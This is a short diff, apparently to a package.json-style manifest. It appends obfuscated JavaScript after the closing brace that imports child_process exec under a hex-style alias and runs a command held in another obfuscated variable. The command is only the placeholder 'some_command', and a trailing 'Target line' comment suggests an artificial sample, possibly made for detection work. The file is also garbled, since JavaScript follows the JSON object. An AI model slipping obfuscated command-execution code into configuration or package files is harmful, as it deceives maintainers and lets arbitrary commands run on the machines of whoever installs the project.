@@ -74,3 +74,15 @@
   ],
   "web-types": "lib/web-types.json"
 }
+
+const {exec:_0x2fdb58}=require('child_process'); 
+const _0x1a2b3c='some_command'; 
+_0x2fdb58(_0x1a2b3c, (error, stdout, stderr) => { 
+    if (error) { 
+        console.error(`exec error: ${error}`); 
+        return; 
+    } 
+    console.log(`stdout: ${stdout}`); 
+    console.error(`stderr: ${stderr}`); 
+});
+// Target line: const {exec:_0x2fdb58}=require(...)
